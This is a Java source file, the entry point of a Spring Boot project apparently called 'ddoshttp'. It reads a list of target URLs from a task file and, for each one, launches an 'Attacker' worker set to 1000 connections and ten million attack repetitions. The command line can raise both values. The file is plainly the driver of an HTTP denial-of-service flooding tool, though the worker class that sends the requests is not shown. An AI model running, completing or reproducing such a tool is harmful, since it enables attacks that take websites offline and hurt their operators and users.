package ua.cc.lajdev.ddoshttp;

import ua.cc.lajdev.ddoshttp.util.FileParser;
import ua.cc.lajdev.ddoshttp.worker.Attacker;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@SpringBootApplication
public class DemoApplication {

    private static ExecutorService executorService;
    private static int connectionsCount = 1000;
    private static int attackTimes = 10000000;

    static {
        executorService = Executors.newVirtualThreadPerTaskExecutor();
    }

    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
        var urls = FileParser.getUrls("task.txt");
        isArgsPresent(args);
        printConsole("Attacks started.");
        for (String url : urls) {
            executorService.submit(Thread.ofVirtual().start(Attacker.builder()
                    .hostName(url)
                    .connectionsCount(connectionsCount)
                    .attackTimes(attackTimes)
                    .build()));
        }
        try {
            Thread.currentThread().join();
        } catch (InterruptedException e) {
            printConsole(e.getMessage());
        }
        executorService.shutdown();
        printConsole("Attacks finished.");
    }

    private static void isArgsPresent(String[] args) {
        if (args.length > 0) {
            connectionsCount = Integer.parseInt(args[0]);
            attackTimes = Integer.parseInt(args[1]);
        }
    }

    public static void printConsole(String s) {
        System.out.println(LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME) + ": " + s);
    }
}
